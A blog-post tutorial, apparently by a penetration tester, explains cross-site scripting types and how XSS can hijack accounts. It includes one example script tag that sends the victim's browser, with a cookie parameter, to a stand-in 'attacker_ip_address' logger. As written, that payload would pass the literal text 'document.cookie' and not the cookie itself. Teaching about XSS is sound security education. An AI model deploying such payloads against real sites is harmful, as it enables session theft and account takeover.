---
layout: post
title: Hijacking account via XSS
description: "A simple proof of concept on how to steal account via XSS vulnerability! April 7"
tags: [xss, hacking, exploitation]
comments: true
---
[Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

### Sniff like a dog

Before initiating a pentest, I normally play with the application first. I use different tools to watch the traffic. I take down notes of things that I'm very interested in such as changing password, updating profile, uploading attachments, etc. You have to examine/dissect the request that was generated. You have to think harder, generate the flow on your head by asking yourself with "what if I bypass this/that". You have to be creative! This is what sets hackers apart from script kiddies.

### Let's start the exploitation

There are multiple ways we can test an application for vulnerabilities. I'll be demonstrating persistent XSS attack. XSS is a vulnerability that is 98% caused by developer's carelessness. XSS vulnerability is actually very easy to fix. However, the cause it brings can be small to massive.

#### What is Persistent XSS attack
There are 3 different types of Cross Site Scripting attack, reflected, persistent and DOM-based. Reflected attack is normally accomplished with social engineering such as sending an email to the victim with a link that contains a script on the url. When this link is clicked by the victim, part of the HTML page is modified. When the HTML page gets loaded, the script is executed without the knowledge of the victim. An example attack would be including the code

{% highlight html %}
 <script>document.location.href="http://attacker_ip_address/script.php?c=document.cookie"</script>
{% endhighlight %}

What this will do is that it will retrieve the document.cookie which might contain the session id thereby allowing the attacker to gain more information about the victim's existing connection. It will initiate a call back to the attacker's server ip address containing the cookies. On the attacker's side, he might have a logger that stores all the values of c(see query string above).